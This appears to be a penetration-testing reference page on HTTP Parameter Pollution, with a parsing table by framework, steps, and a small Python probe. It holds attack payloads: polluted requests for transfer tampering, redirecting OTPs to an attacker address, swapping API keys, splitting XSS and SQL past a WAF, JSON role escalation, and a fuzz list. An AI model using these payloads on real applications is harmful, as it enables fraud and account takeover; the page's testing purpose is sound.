# Parameter Pollution

> **Summary**: HTTP Parameter Pollution (HPP) exploits how web servers handle duplicate parameters to manipulate application logic, bypass security controls, or alter functionality.
> **Impact**: WAF bypass, authentication/authorization bypass, business logic manipulation, transaction tampering, and social engineering amplification.
> **Typical Severity**: Medium

---

## Detection

### Indicators
- Application accepts user input via query string or POST body parameters
- Multiple backend technologies in the stack (reverse proxy + application server) that may parse parameters differently
- Share/redirect features that reflect URL parameters
- API endpoints that pass parameters between services

### Automated Detection
```bash
# Test duplicate parameter behavior
curl "<TARGET_URL>?id=1&id=2" -v
# Compare response against single-parameter request
curl "<TARGET_URL>?id=1" -v
```

### Manual Detection
1. Send a request with duplicate parameters: `?param=value1&param=value2`
2. Observe which value the application uses (first, last, concatenated, or array)
3. Use Wappalyzer or similar to identify the backend technology
4. Cross-reference with the technology parsing table below

---

## Exploitation

### Prerequisites
- At least one parameter is attacker-controllable
- Application does not explicitly validate or deduplicate parameters before processing
- Backend and frontend (or WAF and backend) parse parameters differently

### Technology-Specific Parameter Parsing

| Technology | Duplicate Handling | Array `name[]` | Notes |
|------------|-------------------|-----------------|-------|
| PHP 8.x + Apache | **Last** parameter | Recognized | Ignores after `%00` in param name |
| Python Flask/Werkzeug | **First** parameter | Not recognized | |
| Python Django | **Last** parameter | Not recognized | |
| Python Tornado | **Last** parameter | Not recognized | |
| Ruby WEBrick | **First** parameter | Not recognized | Supports `;` as delimiter |
| Node.js Express | **Concatenated** (array) | Recognized | Returns array for duplicates |
| Java Spring MVC / Tomcat | **Concatenated** (comma-separated) | Recognized | Prefers plain name over `name[]` |
| Go (net/http) | **First** parameter | Not recognized | |
| ASP.NET / IIS | **All** (comma-separated) | Recognized | |

### Step-by-Step

1. **Identify technology stack** -- use Wappalyzer, response headers, or error pages to determine backend framework
2. **Determine parsing behavior** -- send `?test=A&test=B` and observe whether `A`, `B`, `A,B`, or `[A,B]` is used
3. **Identify attack surface** -- find parameters that control sensitive operations (auth, payments, redirects)
4. **Craft pollution payload** -- duplicate the target parameter with a malicious value, positioning it according to the parsing behavior (first or last)
5. **Validate impact** -- confirm the manipulated parameter alters application behavior
6. **Success criteria** -- different backend component processes the attacker's parameter value instead of the legitimate one

### Server-Side HPP (Business Logic)

**Transaction Tampering** (banking/payment flows):
```
# Original
POST /transfer
from=accountA&to=accountB&amount=100

# Polluted -- backend charges accountC instead of accountA
POST /transfer
from=accountA&to=accountB&amount=100&from=accountC
```

**OTP/2FA Bypass** (PHP -- uses last `email` value):
```
# OTP sent to attacker email instead of victim
POST /send-otp
email=victim@target.com&email=attacker@evil.com
```

**API Key Manipulation**:
```
POST /settings/update-api-key
api_key=<LEGITIMATE_KEY>&api_key=<ATTACKER_CONTROLLED_KEY>
```

### Client-Side HPP (Social Media Share Links)

1. Find a page with social media share functionality
2. Identify the share URL construction (e.g., Twitter intent)
3. Append a polluted parameter to the shared URL:
```
https://target.com/article?text=;Visit%20https://evil.com
```
4. When the user clicks share, the tweet contains: `<original_message>;Visit https://evil.com`

### WAF Bypass via HPP

Split a blocked payload across multiple instances of the same parameter:

```
# Single payload (blocked by WAF)
target.com/page?search=<script>alert(1)</script>

# Polluted across parameters (may bypass WAF)
target.com/page?search=<script>alert&search=(1)</script>

# ASP/IIS concatenation
target.com/file.asp?p=SELECT&p=1&p=FROM&p=users
# Backend sees: p=SELECT,1,FROM,users
```

### JSON Parameter Pollution

**Duplicate Keys** -- frontend and backend may parse differently:
```json
{"role": "user", "role": "admin"}
```
Frontend might use the first (`user`), backend might use the last (`admin`).

**Character Truncation / Collision**:
```json
{"role": "administrator\ud800"}
{"role": "admin\istrator"}
```
Frontend sees invalid/truncated value, backend processes the full value.

**Comment Truncation** (parser-dependent):
```json
{"test": 2, "extra": /*, "test": 1, "extra2": */}
```
Some parsers strip comments (GoJay: `test=2`), others ignore them (JSON-iterator: `test=1`).

### Pollution Payload Fuzz List

```
?id=id=1
&id=1?id=2
?id['&id=1']=2
?id[1&id=2]=1
?id=1&id=2
?id=1%26id%3D2
?id&id=1
????id=1
&&&&id=1
?id=1#id=2
?id==1
;id=1?id=2
?id;id=1
&id=1;id=2
#id=1?id=2&id=3
?id=1,2
?id[]=1&id=2
?id=/:@&=+$&id=2
?id=%23?id=1
?id=1%26id=2
?id=1%2526id=2
?id=1%c0%a6id=2
?id=1&amp;id=2
?id=1&#38;id=2
```

### Proof of Concept
```python
import requests

target = "<TARGET_URL>"

# Test which parameter value the backend uses
for position in ["first", "last", "both"]:
    r = requests.get(target, params=[("id", "FIRST"), ("id", "LAST")])
    print(f"Response with duplicate params: {r.text[:200]}")
    # Check if FIRST, LAST, or FIRST,LAST appears in response
```

---

## Bypasses

- **URL encoding**: `%26` for `&` to smuggle additional parameters past URL parsers
- **Double URL encoding**: `%2526` for `%26` to bypass WAF decoding
- **Semicolon delimiter**: `;id=2` works as parameter separator in Ruby WEBrick and some Java servers
- **Array notation**: `param[]` vs `param` may be processed differently
- **Hash fragment**: `#param=value` may be interpreted differently by frontend vs backend
- **Overlong UTF-8**: `%c0%a6` as alternative encoding for `&`

---

## Escalation

- **Chain with SSRF**: pollute redirect/callback URL parameters to hit internal services
- **Chain with OAuth flows**: duplicate `redirect_uri` or `state` parameters to hijack OAuth tokens
- **Chain with rate limiting**: pollution may bypass rate-limit checks keyed on specific parameter values
- **Chain with open redirect**: inject additional URL parameters into redirect targets
- **Privilege escalation**: manipulate role/permission parameters in account update endpoints

---

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite Repeater | Manually craft and test duplicate parameter requests |
| [Wappalyzer](https://www.wappalyzer.com/) | Identify backend technologies and their parsing behavior |
| Burp Suite Intruder | Fuzz with the pollution payload list |
| [ParamMiner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Discover hidden parameters that may be pollutable |

---

## References

- [OWASP HTTP Parameter Pollution](https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf)
- [HTTP Parameter Pollution in 2024](https://medium.com/@0xAwali/http-parameter-pollution-in-2024-32ec1b810f89)
- [JSON Interoperability Vulnerabilities - Bishop Fox](https://bishopfox.com/blog/json-interoperability-vulnerabilities)
- [PayloadsAllTheThings - HPP](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

**See also**: [Rate Limit Bypass](rate-limit-bypass.md) | [Open Redirect](open-redirect.md) | [SSRF](ssrf.md)
